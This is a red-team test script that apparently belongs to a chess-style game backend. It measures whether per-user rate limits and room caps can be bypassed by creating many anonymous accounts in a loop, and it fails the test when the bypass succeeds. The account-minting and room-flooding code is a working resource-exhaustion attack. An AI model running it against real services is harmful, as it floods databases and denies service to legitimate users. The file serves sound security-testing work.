// RED TEAM / session surface #3 — are the limits PER-USER and therefore bypassable by minting many anon accounts?
// The edge function rate-limits on p_user (the uid) and game_create caps a user at 3 WAITING rooms. None of that is
// tied to an IP, device, or proof-of-work. Anonymous sign-in is free and unauthenticated. So an outsider who loops
// /auth/v1/signup gets a fresh uid — and a fresh, empty rate-limit + room-cap bucket — for every request.
//
// This test MEASURES the bypass: a single account is capped at 3 open rooms, but N accounts create ~3N rooms with no
// throttle at all. If that holds, the per-user throttle provides ZERO protection against an outside attacker and the
// DB can be filled without bound (resource exhaustion).
// Convention: EXPLOITED => throw (exit 1). BLOCKED => exit 0.
import { anon, call } from "../flow.test.ts";

const URL_ = process.env.SB_URL ?? "http://127.0.0.1:54321";
const KEY = process.env.SB_KEY ?? "sb_publishable_ACJWlzQHlZjBrEguHvfOxg_3BJgxAaH";

// Confirm first that a SINGLE account really is capped (so the multi-account result is a genuine bypass, not "no cap").
async function singleAccountCap(): Promise<number> {
  const t = await anon();
  let made = 0;
  for (let i = 0; i < 6; i++) {
    const r = await call(t, { action: "create", color: "white" });
    if (r.status === 200) made++; else break; // first 429 (too_many_rooms) stops us
  }
  return made;
}

// How many brand-new anonymous accounts can an outsider mint in a tight loop? (identity = the thing being rate-limited)
async function mintAccounts(n: number): Promise<string[]> {
  const out: string[] = [];
  const lots = 8; // modest concurrency
  for (let i = 0; i < n; i += lots) {
    const batch = await Promise.all(Array.from({ length: Math.min(lots, n - i) }, () =>
      anon().then((t) => t).catch((e) => { console.log("signup refused:", String(e).slice(0, 80)); return ""; })));
    out.push(...batch.filter(Boolean));
  }
  return out;
}

const cap = await singleAccountCap();
console.log(`single account could open ${cap} rooms before being capped (expected 3)`);

const N = 12;
const toks = await mintAccounts(N);
console.log(`minted ${toks.length}/${N} fresh anonymous accounts with the public key alone`);

// Each fresh account opens 3 rooms. Count total successful rooms and any throttling.
let rooms = 0, throttled = 0;
for (let i = 0; i < toks.length; i += 8) {
  const batch = toks.slice(i, i + 8);
  const results = await Promise.all(batch.flatMap((t) => [0, 1, 2].map(() => call(t, { action: "create", color: "random" }))));
  for (const r of results) { if (r.status === 200 && r.body?.id) rooms++; else if (r.status === 429) throttled++; }
}
console.log(`across ${toks.length} accounts: opened ${rooms} rooms, ${throttled} throttled`);

// Bypass is proven if the fleet opened far more rooms than one account ever could, with no aggregate throttle.
const bypassed = toks.length >= 8 && rooms >= cap * 3 && rooms >= 24;
if (bypassed) {
  throw new Error(
    `PER-USER LIMIT BYPASSED: one account caps at ${cap} rooms, but ${toks.length} free anonymous accounts opened ` +
    `${rooms} rooms with ${throttled} throttles. Rate limits key on the uid only; anon sign-in is free and not bound ` +
    `to IP/device, so an outsider mints unlimited identities (local anonymous_users=5000/hr) and multiplies every ` +
    `per-user limit — enabling room/DB resource exhaustion. Endpoint: ${URL_} key: ${KEY.slice(0, 16)}…`);
}
console.log("\nmulti-account amplification did NOT exceed the single-account cap — BLOCKED");
process.exit(0);
